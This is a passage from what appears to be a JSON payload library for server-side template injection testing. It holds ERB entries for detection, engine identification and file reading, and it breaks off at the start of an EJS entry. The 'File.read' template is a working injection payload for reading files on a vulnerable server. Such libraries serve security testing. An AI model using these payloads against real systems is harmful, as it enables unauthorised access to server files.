      "mode": "detection",
      "template": "<%= 7*7 %>",
      "expected": "49",
      "tags": [
        "detection",
        "arithmetic"
      ]
    },
    {
      "id": "ssti-erb-id-strmul",
      "name": "ERB string repeat",
      "category": "ssti",
      "engine": "erb",
      "mode": "identification",
      "template": "<%= 'a'*3 %>",
      "expected": "aaa",
      "tags": [
        "identification"
      ]
    },
    {
      "id": "ssti-erb-file-read",
      "name": "ERB File.read",
      "category": "ssti",
      "engine": "erb",
      "mode": "file-read",
      "template": "<%= File.read('<<POAD_FILE>>') %>",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read",
        "ruby"
      ],
      "notes": "Ruby ERB can read files directly if the context evaluates arbitrary Ruby."
    },
    {
      "id": "ssti-ejs-detect",
